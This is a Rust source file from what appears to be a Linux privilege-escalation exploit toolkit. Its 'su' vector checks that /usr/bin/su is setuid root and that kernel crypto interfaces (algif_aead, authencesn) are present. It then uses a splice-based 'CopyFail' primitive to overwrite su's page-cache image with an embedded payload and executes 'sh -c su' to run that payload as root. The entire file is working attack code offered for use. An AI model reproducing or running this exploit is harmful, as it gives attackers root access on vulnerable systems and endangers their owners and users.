use crate::splice::CopyFail;
use crate::syscall::close_fd;
use crate::vectors::payload::PAYLOAD;
use crate::{Error, Vector};
use core::ptr;

pub struct SuVector;

const SU_PATH_NUL: &[u8] = b"/usr/bin/su\0";
const SHELL_PATH_NUL: &[u8] = b"/bin/sh\0";
const SH_ARG0_NUL: &[u8] = b"sh\0";
const SH_DASH_C_NUL: &[u8] = b"-c\0";
const SU_CMD_NUL: &[u8] = b"su\0";

impl Vector for SuVector {
    fn name(&self) -> &'static str {
        "su"
    }

    fn applicable(&self) -> Result<bool, Error> {
        if PAYLOAD.is_empty() {
            return Ok(false);
        }
        unsafe {
            let mut st: libc::stat = core::mem::zeroed();
            if libc::stat(SU_PATH_NUL.as_ptr() as *const _, &mut st) != 0 {
                return Ok(false);
            }
            // Require setuid bit (S_ISUID) and owned by root (uid 0).
            if (st.st_mode & libc::S_ISUID) == 0 {
                return Ok(false);
            }
            if st.st_uid != 0 {
                return Ok(false);
            }
        }
        let kst = crate::check::check_kernel()?;
        Ok(kst.algif_aead_module || kst.authencesn_template)
    }

    fn execute(&self, primitive: &mut CopyFail) -> Result<(), Error> {
        if PAYLOAD.is_empty() {
            return Err(Error::NotImplemented);
        }
        // Reject unaligned payloads at runtime: a tail-pad write would zero
        // bytes past the payload in the page cache, corrupting the loaded
        // image. The .S sources are responsible for ending on a 4-byte
        // boundary; the Makefile builds them to ensure this.
        if !PAYLOAD.len().is_multiple_of(4) {
            return Err(Error::InvalidArgument(
                "payload length must be a multiple of 4",
            ));
        }
        unsafe {
            let fd = libc::open(SU_PATH_NUL.as_ptr() as *const _, libc::O_RDONLY);
            if fd < 0 {
                return Err(Error::OpenFailed);
            }
            // Prime the page cache: read the relevant prefix.
            // splice() inside the primitive uses an explicit src_off=0, so
            // the file's internal offset after this read is irrelevant.
            let mut prime = [0u8; 4096];
            let mut primed = 0usize;
            let want = PAYLOAD.len() + 4096;
            while primed < want {
                let n = libc::read(fd, prime.as_mut_ptr() as *mut _, prime.len());
                if n <= 0 {
                    break;
                }
                primed += n as usize;
            }

            let res = primitive.write_buffer(fd, PAYLOAD);
            close_fd(fd);
            res?;
        }

        // execve("/bin/sh", ["sh","-c","su", NULL], envp_min)
        let env_path: &[u8] =
            b"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0";
        let argv: [*const u8; 4] = [
            SH_ARG0_NUL.as_ptr(),
            SH_DASH_C_NUL.as_ptr(),
            SU_CMD_NUL.as_ptr(),
            ptr::null(),
        ];
        let envp: [*const u8; 2] = [env_path.as_ptr(), ptr::null()];
        unsafe {
            libc::execve(
                SHELL_PATH_NUL.as_ptr() as *const _,
                argv.as_ptr() as *const *const _,
                envp.as_ptr() as *const *const _,
            );
        }
        Err(Error::Io)
    }
}
